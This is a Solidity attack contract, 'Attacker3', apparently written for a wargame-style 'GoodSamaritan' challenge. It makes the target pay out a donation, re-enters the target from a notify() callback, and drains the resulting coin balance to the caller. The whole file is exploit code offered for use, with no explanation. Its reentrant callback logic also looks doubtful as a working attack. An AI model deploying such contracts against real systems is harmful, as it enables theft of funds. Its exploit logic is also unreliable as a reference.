pragma solidity ^0.8.0;

interface IGoodSamaritan {
    function requestDonation() external returns (bool);
    function wallet() external view returns (address);
}


interface IWallet {
    function coin() external view returns (address);
}


interface Coin {
    function balances(address) external view returns (uint256);
    function transfer(address, uint256) external;
}


contract Attacker3 {
    IGoodSamaritan goodSamaritan;
    Coin coin;

    constructor(address goodSamaritanAddr) {
        goodSamaritan = IGoodSamaritan(goodSamaritanAddr);
        address walletAddress = goodSamaritan.wallet();
        address coinAddress = IWallet(walletAddress).coin();
        coin = Coin(coinAddress);
    }

    function startAttack() external {
        goodSamaritan.requestDonation();
    }

    function notify(uint256) external {
        goodSamaritan.requestDonation();
    }

    function drainCoins() external {
        uint256 balance = coin.balances(address(this));
        require(balance > 0, "No coins to drain");
        coin.transfer(msg.sender, balance);
    }

    receive() external payable {
        // Accept ETH if needed
    }
}
